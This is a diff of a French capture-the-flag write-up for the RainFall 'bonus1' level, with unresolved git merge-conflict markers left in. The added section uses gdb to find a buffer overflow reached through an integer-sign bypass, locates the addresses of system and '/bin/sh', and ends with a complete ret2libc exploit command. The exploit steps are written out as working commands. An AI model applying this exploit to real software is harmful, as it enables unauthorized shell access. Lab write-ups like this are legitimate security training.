@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 test du programme
 
 			bonus1@RainFall:~$ ls
@@ -47,3 +48,68 @@ on utilise gdb
 			   0x080484a4 <+128>:	ret    
 			End of assembler dump.
 			(gdb) 
+=======
+En utilisant gdb on voit que:
+    - le code prend 2 argument
+    - vérifie que le premier est inférieur à 10
+    - le multiplie par 4 et le stock dans une variable
+    - fais un memcpy d'un buffer de 40 et du deuxième argument
+    - lance un shell si la variable contenant le premier argument est égal à 0x574f4c46
+
+Il y a un memcpy qu'on va donc utilsier pour un bufferoverflow
+Le code contient bien "/bin/sh" et system
+
+On peut donc faire une ret2libc attack.
+
+On recherche en premier l'offset.
+
+On va regarder l'etat de ECX à l'endroit ou est stock notre input*4
+soit main+79
+
+UINT_MAX    =  4294967295
+UINT_MAX/4  =  1073741823
+
+On va donc essayer avec -1073741823 (car notre programme ne peut pas fonctionner avec des nombres supérieur à 9)
+
+gdb bonus1
+(gdb) b *main+79
+(gdb)  r -1073741823 test
+(gdb) p $ecx
+$1 = 4
+
+Donc -1073741823 est égal à 1 pour notre programme, ce qui nous donne 4 car 1*4 = 4
+
+On va donc ajouter plu que 10 à -1073741823, pour overflow notre buffer
+On prend donc -1073741800
+
+On utilise un buffer overflow pattern generator.
+
+(gdb)  r -1073741800 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Program received signal SIGSEGV, Segmentation fault.
+0x39624138 in ?? ()
+
+On a donc notre offset au byte 56.
+On peut commencer à chercher les adresses de system et /bin/sh pour notre exploit.
+
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xb7e6b060  __libc_system
+0xb7e6b060  system
+0xb7f49550  svcerr_systemerr
+
+L'adresse de system est 0xb7e6b060
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+
+L'adresse de /bin/sh est 0xb7f8cc58
+
+
+On peut maintenant créer notre exploit:
+
+./bonus1 -1073741803 `python -c 'print "A" * 56 + "\x60\xb0\xe6\xb7" + "AAAA" +"\x58\xcc\xf8\xb7"'`
+>>>>>>> 8669a7e5fb63edf774e5a6592acdd662f0a136bf
